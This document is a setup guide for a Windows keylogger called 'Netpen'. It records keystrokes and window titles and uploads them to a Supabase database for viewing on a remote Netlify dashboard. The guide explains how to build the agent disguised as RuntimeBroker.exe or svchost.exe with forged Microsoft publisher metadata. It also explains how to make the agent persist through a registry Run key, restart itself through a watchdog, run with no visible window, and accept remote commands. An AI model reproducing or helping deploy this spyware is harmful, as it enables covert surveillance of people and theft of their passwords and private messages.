# Netpen - Setup Guide

## Overview
Three parts:
1. **Agent** — runs on the device, records keyboard activity + active window titles
2. **Supabase** — cloud database that stores the activity logs
3. **Netlify dashboard** — web page to view activity logs remotely

---

## Part 1: Create Supabase Database

1. Go to https://supabase.com and sign up / log in
2. Click **New Project**, give it a name (e.g. "netpen"), set a secure DB password
3. Wait for the database to provision (~1 min)
4. Once ready, go to **SQL Editor** in the left sidebar
5. Click **New Query** and paste:

```sql
create table keystrokes (
  id bigint generated always as identity primary key,
  created_at timestamptz default now(),
  window_title text,
  keys text,
  hostname text
);

create table control (
  id bigint generated always as identity primary key,
  created_at timestamptz default now(),
  command text,
  hostname text,
  executed boolean default false
);
```

6. Click **Run** — both tables are created
7. Go to **Project Settings** → **API** in the left sidebar
8. Copy two values:
   - **Project URL** (looks like `https://xxxxx.supabase.co`)
   - **anon public key** (long string starting with `eyJ...`)
9. Go to **Authentication** → **Policies**, click on the `keystrokes` table, then **Enable RLS**, then **Create policy** → "Allow all" → Review → Create policy
10. Do the same for the `control` table

> Or just disable RLS entirely: Table Editor → select table → toggle RLS off.

---

## Part 2: Configure & Compile

### Install MinGW
1. Download MSYS2 from https://www.msys2.org
2. Install and follow the setup instructions
3. Open **MSYS2 UCRT64** terminal and run:
   ```
   pacman -S mingw-w64-ucrt-x86_64-gcc
   ```
4. Close MSYS2. Add MinGW to PATH:
   - Open Windows search → type "environment variables"
   - Edit system environment variables → Environment Variables
   - Under Path, add: `C:\msys64\ucrt64\bin`
   - Click OK

### Configure agent.cpp
1. Open `monitor.cpp` in a text editor
2. Find these lines at the top:
   ```cpp
   #define SUPABASE_HOST L"YOUR_PROJECT.supabase.co"
   #define SUPABASE_ANON_KEY L"eyJ...example"
   ```
3. Replace `YOUR_PROJECT.supabase.co` with your actual Supabase project URL (remove `https://`)
4. Replace the anon key with your actual anon key
5. Save the file

### Compile
1. Open **PowerShell** in the project folder
2. Run:
   ```
   .\build.ps1
   ```
3. You should see `Build successful: RuntimeBroker.exe`

The .exe includes version metadata so Task Manager shows:
- **Process name**: `RuntimeBroker.exe`
- **Description**: `Runtime Broker`
- **Publisher**: `Microsoft Corporation`

To use a different name (e.g. `svchost.exe`, `sihost.exe`):
1. Edit `version.rc` and change all `RuntimeBroker.exe` references
2. Edit `build.ps1` and change the output filename
3. Re-run `.\build.ps1`

**All names auto-adapt in code**: mutex, window class, registry key, log file, and destination path all derive from whatever the .exe is named.

---

## Part 3: Deploy Dashboard to Netlify

1. Go to https://netlify.com and sign up / log in
2. Open `dashboard.html` in a text editor
3. Find these lines:
   ```js
   const SUPABASE_URL = 'https://YOUR_PROJECT.supabase.co';
   const SUPABASE_ANON_KEY = 'eyJ...example';
   ```
4. Replace with your actual Supabase URL and anon key
5. Save the file
6. Go to Netlify → **Sites** → drag and drop `dashboard.html` onto the page
7. Netlify gives you a URL like `https://random-name.netlify.app`
8. Bookmark this URL — this is where you'll view the activity logs

---

## Part 4: Run the Agent

### First run
1. Place `RuntimeBroker.exe` anywhere (Downloads, Desktop, `C:\Windows\Temp\`, etc.)
2. **Right-click → Run as Administrator** (only needed once)
3. The agent:
   - Copies itself to `%APPDATA%\[filename]`
   - Registers for auto-start under `HKLM\...\Run`
   - Spawns a watchdog process that monitors the recording process — if terminated, it restarts within 3 seconds
   - Re-asserts the startup entry every 2 minutes
   - Runs silently — **no window, no icon, nothing visible**
4. **Two processes** run in the background: watchdog + recorder
5. Persists across reboots

### How to verify it's running
- Task Manager → look for the process name appearing **twice**
- Check the log file at `%APPDATA%\[filename].log`

---

## Part 5: View Activity Logs

1. Open your Netlify URL on any device (phone, laptop, anywhere)
2. Wait ~10–15 seconds for the first batch of data to arrive
3. The page auto-refreshes every 5 seconds
4. You'll see: **Time** | **Host** | **Window** | **Activity**

### To Stop the Agent
1. On the dashboard, enter the device's hostname in the input field
2. Click **Stop Agent**
3. The recorder process exits within 30 seconds
4. The watchdog restarts it in 3 seconds
5. To permanently stop, kill **both** processes in Task Manager
6. Remove the startup entry:
   - `regedit` -> `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
   - Delete the entry named after your .exe

---

## Finding the Hostname

On the device, open Command Prompt and type:
```
hostname
```
Enter this in the dashboard to stop the agent.

---

## Troubleshooting

| Problem | Fix |
|---------|-----|
| No data appearing | Check the `.log` file for errors. Verify Supabase URL and anon key. |
| Build fails | Make sure MinGW is installed and in PATH. Run `g++ --version` to verify. |
| Dashboard shows errors | Check browser console (F12). Verify Supabase RLS is disabled or policies allow anon access. |
| .exe won't run | Run as Administrator. Check antivirus (some may flag it). |
| Need to uninstall | Kill both processes in Task Manager. Delete the reg key in `HKLM\...\Run`. Delete `%APPDATA%\[your exe name]` and the original .exe. |
